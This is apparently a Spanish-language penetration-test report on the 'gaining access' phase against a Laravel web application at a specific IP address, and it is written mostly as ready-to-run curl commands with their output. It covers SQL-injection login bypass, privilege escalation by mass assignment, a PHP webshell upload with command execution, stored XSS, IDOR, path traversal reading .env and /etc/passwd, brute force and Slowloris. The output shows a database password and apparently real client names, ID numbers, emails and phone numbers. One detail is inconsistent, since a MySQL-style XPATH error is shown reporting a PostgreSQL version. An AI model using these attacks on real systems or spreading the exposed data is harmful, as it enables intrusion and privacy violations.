# Fase 3 - Obtención de Acceso (Gaining Access)

**Target:** http://37.60.230.11
**Objetivo:** Explotar vulnerabilidades para obtener acceso no autorizado.

---

## 1. SQL Injection (SQLi)

### Bypass de login (acceso como admin sin credenciales)
```bash
$ curl -s "http://37.60.230.11/login" -c /tmp/cf \
  -d "login=admin%27+OR+%271%27%3D%271%27+--&password=x&_token=$TOKEN" -L

# Redirige a /admin/dashboard con sesion de admin
# Palabras encontradas: admin, Dashboard, Cerrar, Bienvenido
HTTP 200 -> URL: http://37.60.230.11/admin/dashboard
```

### Extraccion de version PostgreSQL (error-based)
```bash
$ curl -s "http://37.60.230.11/login" \
  -d "login=admin%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--&password=x&_token=$TOKEN"

# Error XPATH devuelve:
# XPATH syntax error: ~PostgreSQL 16.14 (Debian 16.14-1.pgdg120+1) on x86_64-pc-linux-gnu...
```

### Extraccion de tablas y usuarios
Se extrajeron **26 tablas** del schema `public` y **10 usuarios** del sistema.
Usuario de BD identificado: `plaza_user`@`plazamoyobanba`.

---

## 2. Mass Assignment

### Escalacion de usuario normal a admin
```bash
# 1. Registrar usuario normal
$ curl -s -X POST "http://37.60.230.11/register" \
  -d "name=evi&email=evi@test.com&password=pass&password_confirmation=pass&_token=$TOKEN"

# 2. Escalar a admin via Mass Assignment
$ curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&name=evi&role_name=admin&_token=$TOKEN"

# 3. Verificar acceso a panel admin
$ curl -s -o /dev/null -w "%{http_code}" http://37.60.230.11/admin/usuarios
HTTP 200 -> Acceso concedido al panel de administracion
```

---

## 3. File Upload -> Remote Code Execution (RCE)

### Subida de webshell y ejecucion de comandos
```bash
# 1. Crear webshell
$ echo "<?php system(\$_GET['cmd']); ?>" > shell.php

# 2. Subir sin autenticacion
$ curl -s -X POST "http://37.60.230.11/profile/photo" -F "photo=@shell.php"

# 3. Ejecutar comandos
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)

# 4. Leer .env con credenciales
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=cat%20/var/www/html/.env%20|%20grep%20-E%20%27(DB_|APP_DEBUG)%27"
APP_DEBUG=true
DB_CONNECTION=pgsql
DB_HOST=db
DB_PORT=5432
DB_DATABASE=plazamoyobanba
DB_USERNAME=plaza_user
DB_PASSWORD=plaza_pass_123
```

---

## 4. Cross-Site Scripting (XSS) Almacenado

### Inyeccion de script persistente en campo bio
```bash
$ curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&bio=<script>alert(document.cookie)</script>&name=xssuser&_token=$TOKEN"

# Verificacion: el script aparece en el HTML del perfil
$ curl -s "http://37.60.230.11/profile" | grep -o "script>alert.*script"
script>alert(document.cookie)</script>
```

---

## 5. Insecure Direct Object Reference (IDOR)

### Acceso a ventas sin autenticacion
```bash
$ curl -s http://37.60.230.11/api/sales/121
```
```json
{
    "id": 121,
    "code": "VTA-0001",
    "client_id": 55,
    "total": "360.00",
    "client": {
        "full_name": "Diego Alejandro Quispe Sanchez",
        "dni": "42009515",
        "email": "diego.quispe55@mail.com",
        "phone": "900075845"
    }
}
```
```bash
$ curl -s http://37.60.230.11/api/sales/122
```
```json
{
    "id": 122,
    "code": "VTA-0002",
    "client_id": 29,
    "total": "361.40",
    "client": {
        "full_name": "Jose Manuel Navarro Pinto",
        "dni": "42005017",
        "email": "jose.navarro29@mail.com",
        "phone": "900039991"
    }
}
```
**Impacto:** 120 registros accesibles (IDs 121-240), clientes distintos sin autenticacion.

---

## 6. No Rate Limiting

### Fuerza bruta sin bloqueo
```bash
$ for i in $(seq 1 10); do
    curl -s -X POST http://37.60.230.11/login \
      -d "login=test$i@test.com&password=test" -o /dev/null &
  done; wait

# Todas las peticiones respondieron sin bloqueo.
# Tiempo total: ~200ms para 10 requests en paralelo.
# HTTP 200 en todas (sin throttle).
```

---

## 7. Directory Traversal / LFI

### Lectura de archivos sensibles
```bash
$ curl -s "http://37.60.230.11/download?file=../.env"
APP_DEBUG=true
DB_CONNECTION=pgsql
DB_HOST=db
DB_PORT=5432
DB_DATABASE=plazamoyobanba
DB_USERNAME=plaza_user
DB_PASSWORD=plaza_pass_123

$ curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/sh
www-data:x:82:82::/home/www-data:/sbin/nologin
postgres:x:70:70:PostgreSQL user:/var/lib/postgresql:/bin/sh
```

---

## 8. DDoS (Slowloris)

### Prueba de conexiones lentas
```bash
$ slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/"
# 300 conexiones simultaneas abiertas sin cierre.
# Servidor no rechaza conexiones excesivas.
# Sin rate limit ni limite de conexiones simultaneas.
```

---

## 9. Debug Mode Activado

### Exposicion de informacion sensible via error
```bash
$ curl -s "http://37.60.230.11/download?file[]=test"

# Stack trace expone:
# - Laravel 12.58.0
# - PHP 8.2.32
# - Rutas internas: /var/www/html/vendor/laravel/...
# - Variables de entorno: DB_PASSWORD, APP_KEY, MAIL_*
# - Queries SQL ejecutadas en la peticion
```
